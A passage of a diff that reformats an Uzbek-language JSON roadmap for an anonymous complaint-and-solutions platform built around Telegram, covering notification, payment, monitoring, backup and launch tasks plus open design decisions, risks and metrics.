+        "ko'rilgandan keyin tozalanadi"
+      ]
     },
     {
       "id": "D5-T2",
@@ -692,8 +1229,16 @@
       "nom": "Telegram bot: yangi yechim bildirishnomasi",
       "tavsif": "Celery vazifasi orqali yuborish; qayta urinish siyosati; bloklangan foydalanuvchini belgilash.",
       "nega": "Muammo egasiga yechim kelganini bildirmaslik — qaytib kelish siklini butunlay yo'qotadi. Bu retention'ning asosiy dvigateli.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D5-T1"], "holat": "todo",
-      "qabul_mezoni": ["yuborish sinxron EMAS", "403 (bot bloklangan) bo'lsa foydalanuvchi belgilanadi va qayta urinilmaydi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D5-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "yuborish sinxron EMAS",
+        "403 (bot bloklangan) bo'lsa foydalanuvchi belgilanadi va qayta urinilmaydi"
+      ]
     },
     {
       "id": "D5-T3",
@@ -701,8 +1246,17 @@
       "nom": "Kanalga avto-post (qaynoq muammolar)",
       "tavsif": "Celery beat: kuniga N ta eng qaynoq post kanalga; takrorlanmaslik uchun belgilanadi; anonimlik saqlanadi.",
       "nega": "Rejadagi o'sish strategiyasining asosiy kanali. ⚠️ Anonim post kanalga chiqsa ham muallif ko'rinmasligi kerak — bu yerda xato qilish oson.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T11", "D1-T6"], "holat": "todo",
-      "qabul_mezoni": ["bitta post ikki marta chiqmaydi", "anonimlik testi kanal postini ham qoplaydi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T11",
+        "D1-T6"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bitta post ikki marta chiqmaydi",
+        "anonimlik testi kanal postini ham qoplaydi"
+      ]
     },
     {
       "id": "D5-T4",
@@ -710,8 +1264,15 @@
       "nom": "Bildirishnoma sozlamalari",
       "tavsif": "Turi bo'yicha yoqish/o'chirish; jim soatlar.",
       "nega": "Ortiqcha bildirishnoma botdan chiqib ketishga olib keladi — va u qaytmaydi.",
-      "ustuvorlik": "P2", "hajm": "S", "bogliq": ["D5-T2"], "holat": "todo",
-      "qabul_mezoni": ["standart holatda faqat muhim bildirishnomalar yoqiq"]
+      "ustuvorlik": "P2",
+      "hajm": "S",
+      "bogliq": [
+        "D5-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "standart holatda faqat muhim bildirishnomalar yoqiq"
+      ]
     },
     {
       "id": "D5-T5",
@@ -719,18 +1280,33 @@
       "nom": "Ekspertlarga 'javobsiz savollar' dayjesti",
       "tavsif": "Haftada bir marta: ekspert sohasidagi javobsiz muammolar ro'yxati.",
       "nega": "Bu ikki muammoni bir vaqtda hal qiladi — javobsiz savollar kamayadi va ekspert qaytib keladi. Sovuq start davrida eng foydali vazifa.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D3-T5", "D5-T2"], "holat": "todo",
-      "qabul_mezoni": ["faqat ekspert sohasiga mos savollar yuboriladi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D3-T5",
+        "D5-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "faqat ekspert sohasiga mos savollar yuboriladi"
+      ]
     },
-
     {
       "id": "D6-T1",
       "faza": "M6",
       "nom": "Subscription modeli va PRO cheklovlari",
       "tavsif": "plan, status, started_at, expires_at, auto_renew. PRO imkoniyatlari bitta joyda tekshiriladi.",
       "nega": "PRO tekshiruvi kod bo'ylab tarqalsa, muddati tugagan obuna qayerdadir ishlab qolaveradi.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D3-T5"], "holat": "todo",
-      "qabul_mezoni": ["user.has_pro yagona haqiqat manbai", "muddati tugashi Celery bilan tekshiriladi"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D3-T5"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "user.has_pro yagona haqiqat manbai",
+        "muddati tugashi Celery bilan tekshiriladi"
+      ]
     },
     {
       "id": "D6-T2",
@@ -738,8 +1314,16 @@
       "nom": "Click integratsiyasi",
       "tavsif": "Prepare/Complete webhook'lari, imzo tekshiruvi, idempotentlik.",
       "nega": "To'lov webhook'lari TAKRORLANADI. Idempotentlik bo'lmasa foydalanuvchi ikki marta hisobga olinadi yoki ikki marta obuna oladi.",
-      "ustuvorlik": "P2", "hajm": "L", "bogliq": ["D6-T1"], "holat": "todo",
-      "qabul_mezoni": ["bir xil transaction_id ikki marta kelsa ikkinchisi e'tiborsiz qoldiriladi", "barcha so'rovlar jurnalga yoziladi"]
+      "ustuvorlik": "P2",
+      "hajm": "L",
+      "bogliq": [
+        "D6-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bir xil transaction_id ikki marta kelsa ikkinchisi e'tiborsiz qoldiriladi",
+        "barcha so'rovlar jurnalga yoziladi"
+      ]
     },
     {
       "id": "D6-T3",
@@ -747,8 +1331,15 @@
       "nom": "Payme integratsiyasi",
       "tavsif": "Merchant API, CheckPerformTransaction / CreateTransaction / PerformTransaction / CancelTransaction.",
       "nega": "O'zbekistonda ikkala tizim ham kerak — foydalanuvchilar ikkiga bo'lingan.",
-      "ustuvorlik": "P2", "hajm": "L", "bogliq": ["D6-T1"], "holat": "todo",
-      "qabul_mezoni": ["Payme sandbox testlari to'liq o'tadi"]
+      "ustuvorlik": "P2",
+      "hajm": "L",
+      "bogliq": [
+        "D6-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "Payme sandbox testlari to'liq o'tadi"
+      ]
     },
     {
       "id": "D6-T4",
@@ -756,8 +1347,17 @@
       "nom": "Boost (postni ko'tarish)",
       "tavsif": "BoostOrder: complaint, user, amount, starts_at, ends_at. Faol boost hot_score'ga qo'shiladi.",
       "nega": "Boost'ni hot_score'ga qo'shish organik reytingni butunlay bosib ketmasligi kerak — aks holda lenta reklamaga aylanadi va foydalanuvchi ketadi.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D1-T11", "D6-T2"], "holat": "todo",
-      "qabul_mezoni": ["boost belgisi ochiq ko'rinadi", "lentada boost ulushi cheklangan (masalan har 5 postdan 1 tasi)"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T11",
+        "D6-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "boost belgisi ochiq ko'rinadi",
+        "lentada boost ulushi cheklangan (masalan har 5 postdan 1 tasi)"
+      ]
     },
     {
       "id": "D6-T5",
@@ -765,7 +1365,12 @@
       "nom": "Kontakt almashinuvi (Match) — reja 7.5-qadam",
       "tavsif": "Yechim qabul qilingandan keyin ikki tomon roziligi bilan kontakt ochiladi yoki yopiq chat boshlanadi.",
       "nega": "Rejada bu qadam bor, lekin modeli yo'q. ⚠️ Anonim muallif uchun kontakt ochish anonimlikni buzadi — ikki tomonlama ANIQ rozilik shart.",
-      "ustuvorlik": "P2", "hajm": "L", "bogliq": ["D1-T10"], "holat": "todo",
+      "ustuvorlik": "P2",
+      "hajm": "L",
+      "bogliq": [
+        "D1-T10"
+      ],
+      "holat": "todo",
       "qabul_mezoni": [
         "anonim muallifning kontakti roziligisiz OCHILMAYDI",
         "rad etish imkoniyati bor",
@@ -778,18 +1383,30 @@
       "nom": "Kontekstual reklama joylari",
       "tavsif": "AdSlot modeli: kategoriya bo'yicha maqsadlash, ko'rsatish/bosish hisobi.",
       "nega": "Reja bo'yicha 3-daromad manbai. Reklama alohida belgilanishi shart — aks holda ishonch yo'qoladi.",
-      "ustuvorlik": "P3", "hajm": "M", "bogliq": [], "holat": "todo",
-      "qabul_mezoni": ["'Reklama' yorlig'i majburiy", "inqirozli kontent sahifasida reklama KO'RSATILMAYDI"]
+      "ustuvorlik": "P3",
+      "hajm": "M",
+      "bogliq": [],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "'Reklama' yorlig'i majburiy",
+        "inqirozli kontent sahifasida reklama KO'RSATILMAYDI"
+      ]
     },
-
     {
       "id": "D7-T1",
       "faza": "M7",
       "nom": "Sentry va tuzilgan loglash",
       "tavsif": "Xatolar Sentry'ga; so'rov ID'si bilan JSON loglar; shaxsiy ma'lumot loglarga tushmaydi.",
       "nega": "Xatoni foydalanuvchi aytguncha bilmaslik — eng qimmat holat. ⚠️ Anonim post matni logga tushib qolishi mumkin — filtr kerak.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D0-T10"], "holat": "todo",
-      "qabul_mezoni": ["Sentry'da so'rov tanasi maskalangan"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T10"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "Sentry'da so'rov tanasi maskalangan"
+      ]
     },
     {
       "id": "D7-T2",
@@ -797,8 +1414,15 @@
       "nom": "Health check va uptime monitoring",
       "tavsif": "/health/ (db, redis, celery); tashqi monitoring; Telegram'ga ogohlantirish.",
       "nega": "Celery jim to'xtab qolsa sayt ishlayotgandek ko'rinadi, lekin bildirishnomalar va trending o'ladi — bu eng ko'p uchraydigan 'ko'rinmas' nosozlik.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D0-T10"], "holat": "todo",
-      "qabul_mezoni": ["Celery beat oxirgi ishlashi tekshiriladi"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T10"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "Celery beat oxirgi ishlashi tekshiriladi"
+      ]
     },
     {
       "id": "D7-T3",
@@ -806,7 +1430,12 @@
       "nom": "⚠️ Zaxira nusxa VA tiklash mashqi",
       "tavsif": "Kunlik pg_dump, tashqi saqlash (off-site), shifrlash. VA: tiklashni haqiqatan sinab ko'rish.",
       "nega": "Sinalmagan zaxira — zaxira emas, umid. Tiklash mashg'ulotini o'tkazmaguncha zaxira ishlaydimi yo'qmi bilib bo'lmaydi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T10"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T10"
+      ],
+      "holat": "todo",
       "qabul_mezoni": [
         "zaxira boshqa fizik joyda saqlanadi",
         "TIKLASH bir marta amalda bajarilgan va vaqti o'lchangan",
@@ -819,8 +1448,15 @@
       "nom": "Ish faoliyati byudjeti (performance budget)",
       "tavsif": "Lighthouse ≥90; lenta ≤8 so'rov; TTFB <300ms; CI'da tekshiriladi.",
       "nega": "Sekinlashuv asta-sekin va sezilmasdan keladi. O'lchov CI'da bo'lmasa hech kim payqamaydi.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D1-T14"], "holat": "todo",
-      "qabul_mezoni": ["byudjet oshsa CI ogohlantiradi"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T14"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "byudjet oshsa CI ogohlantiradi"
+      ]
     },
     {
       "id": "D7-T5",
@@ -828,8 +1464,15 @@
       "nom": "Ovoz endpoint'iga yuk testi",
       "tavsif": "Locust/k6; viral post stsenariysi (1 daqiqada 1000 ovoz).",
       "nega": "TikTok'dan trafik kelsa yuk bir tekis emas, portlash shaklida keladi. Sanoqchi yangilanishi eng zaif nuqta.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D1-T8"], "holat": "todo",
-      "qabul_mezoni": ["1000 parallel ovozda ma'lumot yo'qolmaydi va sanoq to'g'ri qoladi"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T8"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "1000 parallel ovozda ma'lumot yo'qolmaydi va sanoq to'g'ri qoladi"
+      ]
     },
     {
       "id": "D7-T6",
@@ -837,8 +1480,15 @@
       "nom": "Runbook va favqulodda holat qo'llanmasi",
       "tavsif": "Deploy, rollback, migratsiya, tiklash, inqirozli kontent, huquqiy so'rov — har biri qadamma-qadam.",
       "nega": "Bu hujjatlar tinch paytda yoziladi, chunki kerak bo'lganda yozishga vaqt bo'lmaydi.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D7-T3"], "holat": "todo",
-      "qabul_mezoni": ["boshqa odam runbook bo'yicha deploy qila oladi"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D7-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "boshqa odam runbook bo'yicha deploy qila oladi"
+      ]
     },
     {
       "id": "D7-T7",
@@ -846,7 +1496,10 @@
       "nom": "⚠️ Sovuq start rejasi (ishga tushirishdan OLDIN)",
       "tavsif": "Ommaviy e'londan oldin: 50-100 ta real muammo va 15-20 ta ekspert jalb qilish; birinchi 2 hafta har bir savolga javob kafolati.",
       "nega": "Bu TEXNIK emas, MAHSULOT vazifasi — lekin eng katta yiqilish sababi. Bo'sh platformaga kelgan birinchi foydalanuvchi savol yozadi, javob olmaydi va qaytmaydi. Rejadagi marketing bo'limi virallikni yozgan, lekin dastlabki to'ldirishni yozmagan.",
-      "ustuvorlik": "P0", "hajm": "L", "bogliq": [], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "L",
+      "bogliq": [],
+      "holat": "todo",
       "qabul_mezoni": [
         "ishga tushirish kuni ≥50 muammo va ≥150 yechim bor",
         "har bir kategoriyada kamida 1 faol ekspert",
@@ -859,38 +1512,70 @@
       "nom": "Asosiy metrikalar paneli",
       "tavsif": "Kunlik: yangi muammo, 24 soatda javob olganlar ULUSHI, yechilganlar ulushi, birinchi yechimgacha o'rtacha vaqt, D7 qaytish.",
       "nega": "'24 soatda javob olgan muammolar ulushi' — bu mahsulotning eng muhim salomatlik ko'rsatkichi. U 70% dan pastga tushsa platforma o'la boshlaydi, boshqa barcha raqamlar yaxshi ko'rinsa ham.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D0-T10"], "holat": "todo",
-      "qabul_mezoni": ["metrika kunlik avtomatik hisoblanadi va Telegram'ga yuboriladi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T10"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "metrika kunlik avtomatik hisoblanadi va Telegram'ga yuboriladi"
+      ]
     }
   ],
-
   "ochiq_qarorlar": [
     {
       "id": "Q1",
       "savol": "Vote modeli: umumiy (ContentType) yoki har model uchun alohida jadval?",
       "variantlar": [
-        { "nom": "Alohida jadvallar (ComplaintVote, SolutionVote)", "plus": "Oddiy so'rov, yaxshi indeks, DB darajasida FK butunligi", "minus": "Ozgina takroriy kod" },
-        { "nom": "Umumiy Vote (ContentType)", "plus": "Bitta model, yangi turga oson kengayadi", "minus": "Indeks sekinroq, FK butunligi yo'q, so'rovlar murakkab" }
+        {
+          "nom": "Alohida jadvallar (ComplaintVote, SolutionVote)",
+          "plus": "Oddiy so'rov, yaxshi indeks, DB darajasida FK butunligi",
+          "minus": "Ozgina takroriy kod"
+        },
+        {
+          "nom": "Umumiy Vote (ContentType)",
+          "plus": "Bitta model, yangi turga oson kengayadi",
+          "minus": "Indeks sekinroq, FK butunligi yo'q, so'rovlar murakkab"
+        }
       ],
       "tavsiya": "Alohida jadvallar + umumiy abstrakt asos. Ovoz — eng ko'p yoziladigan jadval, indeks tezligi muhimroq.",
-      "holat": "ochiq"
+      "holat": "yopilgan",
+      "qaror": "Alohida jadvallar (ComplaintVote, SolutionVote) + umumiy abstrakt asos (apps/common/models.py: VoteModel). Sabab: baza darajasidagi FK butunligi va tor indeks. Bajarildi D1-T5 da, 2026-08-27."
     },
     {
       "id": "Q2",
       "savol": "Anonim postlar o'zaro bog'lanmasligi kerakmi?",
       "variantlar": [
-        { "nom": "Yo'q — shunchaki 'Anonim' ko'rsatiladi", "plus": "Oddiy", "minus": "Yozuv uslubi va tafsilotlardan foydalanuvchini taxmin qilish mumkin" },
-        { "nom": "Ha — har postga alohida anon_handle", "plus": "Kuchliroq maxfiylik", "minus": "Anonim postlar ostida izohlar bog'lanmaydi" }
+        {
+          "nom": "Yo'q — shunchaki 'Anonim' ko'rsatiladi",
+          "plus": "Oddiy",
+          "minus": "Yozuv uslubi va tafsilotlardan foydalanuvchini taxmin qilish mumkin"
+        },
+        {
+          "nom": "Ha — har postga alohida anon_handle",
+          "plus": "Kuchliroq maxfiylik",
+          "minus": "Anonim postlar ostida izohlar bog'lanmaydi"
+        }
       ],
       "tavsiya": "Boshlanishida birinchi variant, lekin modelga anon_handle maydonini BO'SH holda qo'shib qo'ying — keyin to'ldirish migratsiyasi arzon bo'ladi.",
-      "holat": "ochiq"
+      "holat": "qisman",
+      "qaror": "Birinchi variant tanlandi (shunchaki 'Anonim'), LEKIN `Complaint.anon_handle` maydoni bo'sh holda qo'shildi — kerak bo'lsa to'ldirish migratsiyasi arzon. 2026-08-27."
     },
     {
       "id": "Q3",
       "savol": "Telegram — yagona kirish usuli bo'lib qolsinmi?",
       "variantlar": [
-        { "nom": "Faqat Telegram", "plus": "Eng past to'siq, reja bo'yicha 1 soniyada kirish", "minus": "Telegram hisobi yo'qolsa akkaunt ham yo'qoladi; xizmat cheklansa hamma kira olmaydi" },
-        { "nom": "Telegram + ixtiyoriy email (tiklash uchun)", "plus": "Zaxira kanal", "minus": "Qo'shimcha ish" }
+        {
+          "nom": "Faqat Telegram",
+          "plus": "Eng past to'siq, reja bo'yicha 1 soniyada kirish",
+          "minus": "Telegram hisobi yo'qolsa akkaunt ham yo'qoladi; xizmat cheklansa hamma kira olmaydi"
+        },
+        {
+          "nom": "Telegram + ixtiyoriy email (tiklash uchun)",
+          "plus": "Zaxira kanal",
+          "minus": "Qo'shimcha ish"
+        }
       ],
       "tavsiya": "MVP'da faqat Telegram, LEKIN autentifikatsiyani provayderdan mustaqil qilib yozing — ikkinchisini qo'shish keyin arzon bo'lsin.",
       "holat": "ochiq"
@@ -899,14 +1584,21 @@
       "id": "Q4",
       "savol": "Qidiruv: PostgreSQL FTS yoki alohida qidiruv tizimi (Meilisearch)?",
       "variantlar": [
-        { "nom": "PostgreSQL FTS", "plus": "Yangi xizmat kerak emas, arzon, yetarlicha yaxshi", "minus": "Xato yozuvlar va reyting sifati o'rtacha" },
-        { "nom": "Meilisearch", "plus": "Ancha yaxshi natija, typo-tolerant", "minus": "Yana bir konteyner, sinxronizatsiya, xotira" }
+        {
+          "nom": "PostgreSQL FTS",
+          "plus": "Yangi xizmat kerak emas, arzon, yetarlicha yaxshi",
+          "minus": "Xato yozuvlar va reyting sifati o'rtacha"
+        },
+        {
+          "nom": "Meilisearch",
+          "plus": "Ancha yaxshi natija, typo-tolerant",
+          "minus": "Yana bir konteyner, sinxronizatsiya, xotira"
+        }
       ],
       "tavsiya": "PostgreSQL FTS + pg_trgm. 100 ming postdan oshgandagina qayta ko'rib chiqing.",
       "holat": "ochiq"
     }
   ],
-
   "risklar": [
     {
       "id": "R1",
@@ -957,13 +1649,36 @@
       "yumshatish": "D1-T5 (unique cheklov) + D2-T4 (tezlik cheklovi) + yangi hisoblar uchun ovoz vazni kamaytirilishi."
     }
   ],
-
   "metrikalar": [
-    { "nom": "24 soatda javob olgan muammolar ulushi", "maqsad": "≥ 80%", "nega": "Mahsulotning asosiy va'dasi. Eng muhim salomatlik ko'rsatkichi." },
-    { "nom": "Birinchi yechimgacha o'rtacha vaqt", "maqsad": "< 6 soat", "nega": "Tez javob qaytib kelishni belgilaydi." },
-    { "nom": "Yechilgan (accepted) muammolar ulushi", "maqsad": "≥ 40%", "nega": "Yechim sifatini ko'rsatadi, shunchaki faollikni emas." },
-    { "nom": "D7 qaytish (retention)", "maqsad": "≥ 25%", "nega": "Bir martalik tashrifchi jamoa qurmaydi." },
-    { "nom": "Ekspert javob darajasi", "maqsad": "≥ 60%", "nega": "PRO monetizatsiyasi ekspert faolligiga bog'liq." },
-    { "nom": "Moderatsiyagacha o'rtacha vaqt", "maqsad": "< 4 soat", "nega": "Sekin moderatsiya = ochiq suiisteʼmol." }
+    {
+      "nom": "24 soatda javob olgan muammolar ulushi",
+      "maqsad": "≥ 80%",
+      "nega": "Mahsulotning asosiy va'dasi. Eng muhim salomatlik ko'rsatkichi."
+    },
+    {
+      "nom": "Birinchi yechimgacha o'rtacha vaqt",
+      "maqsad": "< 6 soat",
+      "nega": "Tez javob qaytib kelishni belgilaydi."
+    },
+    {
+      "nom": "Yechilgan (accepted) muammolar ulushi",
+      "maqsad": "≥ 40%",
+      "nega": "Yechim sifatini ko'rsatadi, shunchaki faollikni emas."
+    },
+    {
+      "nom": "D7 qaytish (retention)",
+      "maqsad": "≥ 25%",
+      "nega": "Bir martalik tashrifchi jamoa qurmaydi."
+    },
+    {
+      "nom": "Ekspert javob darajasi",
+      "maqsad": "≥ 60%",
+      "nega": "PRO monetizatsiyasi ekspert faolligiga bog'liq."
+    },
+    {
+      "nom": "Moderatsiyagacha o'rtacha vaqt",
+      "maqsad": "< 4 soat",
+      "nega": "Sekin moderatsiya = ochiq suiisteʼmol."
+    }
   ]
 }
